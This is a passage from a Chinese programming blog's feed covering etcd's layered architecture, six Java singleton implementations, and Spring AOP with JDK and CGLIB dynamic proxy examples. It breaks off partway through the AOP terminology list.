client 访问 server 和 server 节点之间的通信协议。一方面，client 访问 etcd server 的 API 分为 v2 和 v3 两个大版本。v2 API 使用 HTTP&#x2F;1.x 协议，v3 API 使用 gRPC 协议。同时 v3 通过 etcd grpc-gateway 组件也支持 HTTP&#x2F;1.x 协议，便于各种语言的服务调用。另一方面，server 之间通信协议，是指节点间通过 Raft 算法实现数据复制和 Leader 选举等功能时使用的 HTTP 协议。</li><li><strong>Raft 算法层</strong>：Raft 算法层实现了 Leader 选举、日志复制、ReadIndex 等核心算法特性，用于保障 etcd 多个节点间的数据一致性、提升服务可用性等，是 etcd 的基石和亮点。</li><li><strong>功能逻辑层</strong>：etcd 核心特性实现层，如典型的 KVServer 模块、MVCC 模块、Auth 鉴权模块、Lease 租约模块、Compactor 压缩模块等，其中 MVCC 模块主要由 treeIndex 模块和 boltdb 模块组成。</li><li><strong>存储</strong>层：存储层包含预写日志 (WAL) 模块、快照 (Snapshot) 模块、boltdb 模块。其中 WAL 可保障 etcd crash 后数据不丢失，boltdb 则保存了集群元数据和用户写入的数据。</li></ul>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计模式-单例模式的六种实现方式</title>
    <link href="/2022/09/22/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%85%AD%E7%A7%8D%E5%B8%B8%E8%A7%81%E5%BD%A2%E5%BC%8F/"/>
    <url>/2022/09/22/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%85%AD%E7%A7%8D%E5%B8%B8%E8%A7%81%E5%BD%A2%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>﻿&gt; 最近重新学习了一下单例模式，写博客总结一下，有错误或者另外的方法欢迎指出</p><h1 id="单例模式的六种常见形式"><a href="#单例模式的六种常见形式" class="headerlink" title="单例模式的六种常见形式"></a>单例模式的六种常见形式</h1><h2 id="一、饿汉式：直接创建对象，无线程安全问题"><a href="#一、饿汉式：直接创建对象，无线程安全问题" class="headerlink" title="一、饿汉式：直接创建对象，无线程安全问题"></a>一、饿汉式：直接创建对象，无线程安全问题</h2><p><strong>1.1直接实例化饿汉式（简洁直观）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><br><span class="hljs-comment">//1.1直接实例化饿汉式（简洁直观）</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">直接创建实例对象</span><br><span class="hljs-comment">构造器私有化</span><br><span class="hljs-comment">自行创建，用静态变量保存</span><br><span class="hljs-comment">final用来强调单例，可以不加</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HungrySingleton1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span>  HungrySingleton1  INSTANCE=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HungrySingleton1</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">HungrySingleton1</span><span class="hljs-params">()</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>1.2枚举式（最简洁）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1.2枚举式（最简洁）</span><br><span class="hljs-comment">只声明一个，表示限定为单例</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">HungrySingleton2</span>&#123;<br>        INSTANCE<br>    &#125;<br><br><br><br></code></pre></td></tr></table></figure><p><strong>1.3静态代码块饿汉式（适合复杂饿汉式）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 1.3静态代码块饿汉式（适合复杂饿汉式）</span><br><span class="hljs-comment">* 通过静态代码块创建实例</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HungrySingleton3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> HungrySingleton3   INSTANCE;<br>    <span class="hljs-keyword">static</span> &#123;<br>        INSTANCE=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HungrySingleton3</span>();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">HungrySingleton3</span><span class="hljs-params">()</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="二、懒汉式：延迟创建对象"><a href="#二、懒汉式：延迟创建对象" class="headerlink" title="二、懒汉式：延迟创建对象"></a>二、懒汉式：延迟创建对象</h2><p><strong>2.1线程不安全（适用于单线程）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *2.1线程不安全（适用于单线程）</span><br><span class="hljs-comment"> * 构造器私有化</span><br><span class="hljs-comment"> * 用静态变量修饰</span><br><span class="hljs-comment"> * 提供静态变量方法获取对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">lazySingleton1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> lazySingleton1 instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">lazySingleton1</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> lazySingleton1 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">lazySingleton1</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>2.2线程安全（适用于多线程）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *2.2线程安全（适用于多线程）</span><br><span class="hljs-comment"> * 构造器私有化</span><br><span class="hljs-comment"> * 用静态变量修饰</span><br><span class="hljs-comment"> * 提供静态变量方法获取对象</span><br><span class="hljs-comment"> * 使用synchronized锁住对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">lazySingleton2</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> lazySingleton2 instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">lazySingleton2</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> lazySingleton2 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span>(instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (lazySingleton2.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">lazySingleton2</span>();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p><strong>2.3静态内部类（适用于多线程）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lp.singleton;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *2.3静态内部类（适用于多线程）</span><br><span class="hljs-comment"> * 构造器私有化</span><br><span class="hljs-comment"> * 用静态变量修饰</span><br><span class="hljs-comment"> *在静态内部类被加载和初始化时，才创建INSTANCE实例对象</span><br><span class="hljs-comment"> * 静态内部类单独加载和初始化，不会随着外部类的加载和初始化而初始化</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">lazySingleton3</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">lazySingleton3</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> lazySingleton3   INSTANCE=<span class="hljs-keyword">new</span> <span class="hljs-title class_">lazySingleton3</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> lazySingleton3 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Inner.INSTANCE;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>设计模式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>java</tag>
      
      <tag>设计模式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Spring框架的总结（三、Spring AOP）</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%E3%80%81Spring-AOP%EF%BC%89/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%E3%80%81Spring-AOP%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>﻿# 关于Spring框架的总结（三、Spring AOP）</p><h2 id="3-Spring-AOP"><a href="#3-Spring-AOP" class="headerlink" title="3.Spring AOP"></a>3.Spring AOP</h2><blockquote><p>Spring AOP<br>3.1.Spring AOP的基本概念<br>3.2.动态代理<br>3.3.AOP的常见术语<br>3.4.基于XML配置开发<br>3.5.基于注解开发</p></blockquote><h2 id="3-1-Spring-AOP的基本概念"><a href="#3-1-Spring-AOP的基本概念" class="headerlink" title="3.1.Spring AOP的基本概念"></a>3.1.Spring AOP的基本概念</h2><p><font color=red>AOP (Aspect- Oriented Programming) 即面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。</font color=red>它与OOP (Object-OtientedProgramming,面向对象编程)相辅相成， 提供了与OOP不同的抽象软件结构的视角。在OOP中，以类作为程序的基本单元，而AOP中的基本单元是Aspect (切面)。利用AOP可以对业务逻辑的各个部分进行隔离,从而使得业务逻辑各部分之间的耦合度降低,提高程序的可重用性，同时提高了开发的效率。</p><p>简单的说它就是把我们程序重复的代码抽取出来，在需要执行的时候，使用动态代理的技术，在不修改源码的基础上，对我们的已有方法进行增强。</p><h2 id="3-2-动态代理"><a href="#3-2-动态代理" class="headerlink" title="3.2.动态代理"></a>3.2.动态代理</h2><p><strong>动态代理常用的有两种方式</strong><br><strong>（1）、JDK动态代理（基于接口的动态代理）</strong><br>1.创建接口以及实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IActor</span> &#123;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 基本演出</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> money</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">basicAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 危险演出</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> money</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 一个演员</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//实现了接口，就表示具有接口中的方法实现。即：符合经纪公司的要求</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Actor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IActor</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">basicAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;拿到钱，开始基本的表演：&quot;</span>+money);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;拿到钱，开始危险的表演：&quot;</span>+money);<br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>2.创建代理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//一个剧组找演员：</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">Actor</span> <span class="hljs-variable">actor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Actor</span>();<span class="hljs-comment">//直接</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 代理：</span><br><span class="hljs-comment">* 间接。</span><br><span class="hljs-comment">* 获取代理对象：</span><br><span class="hljs-comment">* 要求：</span><br><span class="hljs-comment">* 被代理类最少实现一个接口</span><br><span class="hljs-comment">* 创建的方式</span><br><span class="hljs-comment">* Proxy.newProxyInstance(三个参数)</span><br><span class="hljs-comment">* 参数含义：</span><br><span class="hljs-comment">* ClassLoader：和被代理对象使用相同的类加载器。</span><br><span class="hljs-comment">* Interfaces：和被代理对象具有相同的行为。实现相同的接口。</span><br><span class="hljs-comment">* InvocationHandler：如何代理。</span><br><span class="hljs-comment">* 策略模式：使用场景是：</span><br><span class="hljs-comment">* 数据有了，目的明确。</span><br><span class="hljs-comment">* 如何达成目标，就是策略。</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">IActor</span> <span class="hljs-variable">proxyActor</span> <span class="hljs-operator">=</span> (IActor) Proxy.newProxyInstance(<br>actor.getClass().getClassLoader(), <br>actor.getClass().getInterfaces(), <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 执行被代理对象的任何方法，都会经过该方法。</span><br><span class="hljs-comment">* 此方法有拦截的功能。</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 参数：</span><br><span class="hljs-comment">* proxy：代理对象的引用。不一定每次都用得到</span><br><span class="hljs-comment">* method：当前执行的方法对象</span><br><span class="hljs-comment">* args：执行方法所需的参数</span><br><span class="hljs-comment">* 返回值：</span><br><span class="hljs-comment">* 当前执行方法的返回值</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <br><span class="hljs-keyword">throws</span> Throwable &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> method.getName();<br><span class="hljs-type">Float</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> (Float) args[<span class="hljs-number">0</span>];<br><span class="hljs-type">Object</span> <span class="hljs-variable">rtValue</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-comment">//每个经纪公司对不同演出收费不一样，此处开始判断</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;basicAct&quot;</span>.equals(name))&#123;<br><span class="hljs-comment">//基本演出，没有 2000 不演</span><br><span class="hljs-keyword">if</span>(money &gt; <span class="hljs-number">2000</span>)&#123;<br><span class="hljs-comment">//看上去剧组是给了 8000，实际到演员手里只有 4000</span><br><span class="hljs-comment">//这就是我们没有修改原来 basicAct 方法源码，对方法进行了增强</span><br>rtValue = method.invoke(actor, money/<span class="hljs-number">2</span>);<br>&#125; &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;dangerAct&quot;</span>.equals(name))&#123;<br><span class="hljs-comment">//危险演出,没有 5000 不演</span><br><span class="hljs-keyword">if</span>(money &gt; <span class="hljs-number">5000</span>)&#123;<br><span class="hljs-comment">//看上去剧组是给了 50000，实际到演员手里只有 25000</span><br><span class="hljs-comment">//这就是我们没有修改原来 dangerAct 方法源码，对方法进行了增强</span><br>rtValue = method.invoke(actor, money/<span class="hljs-number">2</span>);<br>&#125; &#125;<br><span class="hljs-keyword">return</span> rtValue;<br>&#125;<br>&#125;);<br><span class="hljs-comment">//没有经纪公司的时候，直接找演员。</span><br><span class="hljs-comment">// actor.basicAct(1000f);</span><br><span class="hljs-comment">// actor.dangerAct(5000f);</span><br><span class="hljs-comment">//剧组无法直接联系演员，而是由经纪公司找的演员</span><br>proxyActor.basicAct(<span class="hljs-number">8000f</span>);<br>proxyActor.dangerAct(<span class="hljs-number">50000f</span>);<br>&#125; &#125;<br></code></pre></td></tr></table></figure><p><strong>（2）、CGLIB动态代理（基于子类的动态代理）</strong><br>1.创建目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Actor</span>&#123;<span class="hljs-comment">//目标类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">basicAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;拿到钱，开始基本的表演：&quot;</span>+money);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerAct</span><span class="hljs-params">(<span class="hljs-type">float</span> money)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;拿到钱，开始危险的表演：&quot;</span>+money);<br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>2.创建代理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 基于子类的动态代理</span><br><span class="hljs-comment">* 要求：</span><br><span class="hljs-comment">* 被代理对象不能是最终类</span><br><span class="hljs-comment">* 用到的类：</span><br><span class="hljs-comment">* Enhancer</span><br><span class="hljs-comment">* 用到的方法：</span><br><span class="hljs-comment">* create(Class, Callback)</span><br><span class="hljs-comment">* 方法的参数：</span><br><span class="hljs-comment">* Class：被代理对象的字节码</span><br><span class="hljs-comment">* Callback：如何代理</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> args</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">Actor</span> <span class="hljs-variable">actor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Actor</span>();<br><span class="hljs-type">Actor</span> <span class="hljs-variable">cglibActor</span> <span class="hljs-operator">=</span> (Actor) Enhancer.create(actor.getClass(),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodInterceptor</span>() &#123;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 执行被代理对象的任何方法，都会经过该方法。在此方法内部就可以对被代理对象的任何</span><br><span class="hljs-comment">方法进行增强。</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 参数：</span><br><span class="hljs-comment">* 前三个和基于接口的动态代理是一样的。</span><br><span class="hljs-comment">* MethodProxy：当前执行方法的代理对象。</span><br><span class="hljs-comment">* 返回值：</span><br><span class="hljs-comment">* 当前执行方法的返回值</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object proxy, Method method, Object[] args, </span><br><span class="hljs-params">MethodProxy methodProxy)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> method.getName();<br><span class="hljs-type">Float</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> (Float) args[<span class="hljs-number">0</span>];<br><span class="hljs-type">Object</span> <span class="hljs-variable">rtValue</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;basicAct&quot;</span>.equals(name))&#123;<br><span class="hljs-comment">//基本演出</span><br><span class="hljs-keyword">if</span>(money &gt; <span class="hljs-number">2000</span>)&#123;<br>rtValue = method.invoke(actor, money/<span class="hljs-number">2</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;dangerAct&quot;</span>.equals(name))&#123;<br><span class="hljs-comment">//危险演出</span><br><span class="hljs-keyword">if</span>(money &gt; <span class="hljs-number">5000</span>)&#123;<br>rtValue = method.invoke(actor, money/<span class="hljs-number">2</span>);<br>&#125; &#125;<br><span class="hljs-keyword">return</span> rtValue;<br>&#125;<br>&#125;);<br>cglibActor.basicAct(<span class="hljs-number">10000</span>);<br>cglibActor.dangerAct(<span class="hljs-number">100000</span>);<br>&#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-AOP的常见术语"><a href="#3-3-AOP的常见术语" class="headerlink" title="3.3.AOP的常见术语"></a>3.3.AOP的常见术语</h2><p>➊<strong>切面</strong></p><p>切面(Aspect) 是指封装横切到系统功能(例如事务处理)的类。</p><p>❷<strong>连接点</strong></p><p>连接点(Joinpoint)是指程序运行中的一些时间点， 例如方法的调用或异常的抛出。</p><p>❸<strong>切入点</strong></p><p>切入点(Poineu)是指需要处理的连接点。在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息， 它修饰的是连接点。</p><p>❹<strong>通知</strong></p><p>通知(Advice) 是由切面添加到特定的连接点(满足切入点规则)的一段代码，即在定义好的切入点处所要执行的程序代码，可以将其理解为切面开启后切面的方法，因此通知是切面的具体实现。</p><p>❺<strong>引入</strong></p><p>引入( Introduction)允许在现有的实现类中添加自定义的方法和属性。</p><p>❻<strong>目标对象</strong></p><p>目标对象(Target Object)是指所有被通知的对象。如果AOP框架使用运行时代理的方式(动态的AOP)来实现切面，那么通知对象总是一个代理对象。</p><p>❼<strong>代理</strong></p><p>代理(Proxy) 